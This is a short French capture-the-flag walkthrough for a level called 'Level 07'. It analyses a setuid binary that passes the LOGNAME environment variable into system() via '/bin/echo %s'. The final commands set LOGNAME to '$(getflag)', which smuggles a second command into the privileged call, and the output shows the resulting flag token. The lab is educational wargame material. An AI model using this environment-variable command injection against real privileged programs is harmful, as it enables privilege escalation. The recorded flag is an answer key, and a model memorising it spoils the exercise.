# Level 07

Structure du home
```sh
$ ls -la
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
```
On peut appercevoir un executable. Si on l'execute il nous ecrit seulement `level07`.

En tout premier avant de peut etre le decompilé, on peut lancer `strings` dessus.
```
$ strings ./level07
/lib/ld-linux.so.2
__gmon_start__
...
_IO_stdin_used
asprintf
getenv
system
...
__libc_start_main
...
LOGNAME
/bin/echo %s
...
```
Pleins de chose interresant ce montre à nous, comme les fonctions ou meme les strings utilisé.
Comme les fonctions `getenv`, `system`, `asprintf`. Ce qui voudrait dire que l'executable fait appeler à une variable d'envirionement, execute peut etre `/bin/echo %s` et le pourcentage %s comme une valeur dynamique set via le asprintf ?

Testons des trucs
- en premier lieu, le string LOGNAME est t'il la variable d'env ?
- Et si on modifier cette variable
- Grace à la fonction system, on pourrait executer autre chose que /bin/echo
```sh
$ echo $LOGNAME
level07
$ export LOGNAME=getflag
$ ./level07
getflag
$ export LOGNAME='$(getflag)'
$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```